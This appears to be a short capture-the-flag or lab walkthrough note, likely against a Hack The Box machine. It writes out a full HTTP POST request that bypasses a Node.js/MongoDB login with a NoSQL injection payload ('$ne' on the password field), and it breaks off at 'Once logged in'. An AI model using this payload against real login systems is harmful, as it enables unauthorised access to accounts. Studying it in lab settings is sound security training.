Port open that's interesting : 5000

http://10.129.96.160:5000/login

Website is using NodeJS with MangoDB (can see with Wappanalyzer)

From BURP:

* we change Content type to JSON
* and we add bottom json part from normal login, $ne is MangoDB to not EQUAL

POST /login HTTP/1.1
Host: 10.129.96.160:5000
Content-Length: 58
Cache-Control: max-age=0
Accept-Language: en-US,en;q=0.9
Origin: http://10.129.96.160:5000
Content-Type: application/**json**
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/146.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Referer: http://10.129.96.160:5000/login
Accept-Encoding: gzip, deflate, br
Connection: keep-alive

**{"user":"admin",**
**"password":{"$ne":"Invalid Password"}**
**}**

Once logged in